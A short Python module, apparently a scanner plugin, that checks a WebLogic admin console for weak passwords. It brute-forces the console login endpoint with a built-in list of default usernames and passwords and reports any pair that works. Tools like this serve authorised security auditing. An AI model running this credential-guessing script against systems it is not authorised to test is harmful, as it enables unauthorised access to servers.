from typing import Optional

import requests

from lib.log import logger


def run(url: str) -> Optional[str]:
    """Detect WebLogic weak password vulnerability."""
    pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe',
               'wlcsystem', 'wlpisystem', 'weblogic123']
    target_url = f"{url}:7001/console/j_security_check"

    for user in pwddict:
        for pwd in pwddict:
            data = {
                'j_username': user,
                'j_password': pwd,
                'j_character_encoding': 'UTF-8'
            }
            try:
                logger.info(f"Testing credentials: {user}:{pwd}")
                response = requests.post(target_url, data=data, allow_redirects=False, verify=False, timeout=5)
                if response.status_code == 302 and 'console' in response.text and 'LoginForm.jsp' not in response.text:
                    logger.success(f"WebLogic weak password found: username: {user}, password: {pwd}")
                    return f"WebLogic username: {user} password: {pwd}"
                logger.warning(f"Failed with {user}:{pwd}")
            except requests.RequestException as e:
                logger.error(f"Request failed for {user}:{pwd}: {str(e)}")
            except Exception as e:
                logger.error(f"Unexpected error for {user}:{pwd}: {str(e)}")

    logger.warning("No weak passwords found")
    return None


if __name__ == "__main__":
    print(run("http://192.168.27.128"))
